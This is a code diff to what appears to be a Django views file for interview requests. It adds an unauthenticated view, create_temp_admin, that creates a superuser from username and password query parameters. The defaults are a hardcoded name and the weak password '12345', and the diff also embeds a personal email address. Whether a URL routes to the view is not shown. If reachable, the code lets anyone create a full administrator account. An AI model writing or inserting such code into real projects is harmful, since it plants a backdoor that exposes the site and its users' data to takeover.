@@ -38,3 +38,14 @@ class InterviewRequestDetail(generics.RetrieveDestroyAPIView):
     permission_classes = [permissions.IsAdminUser]
     authentication_classes = [BasicAuthentication, SessionAuthentication]
 
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+def create_temp_admin(request):
+    User = get_user_model()
+    username = request.GET.get('user', 'aryan')
+    password = request.GET.get('password', '12345')
+    if not User.objects.filter(username=username).exists():
+        User.objects.create_superuser(username=username, email='aryanyadav892408@gmail.com', password=password)
+        return HttpResponse(f"Superuser '{username}' created successfully!")
+    return HttpResponse(f"Superuser '{username}' already exists.")
+
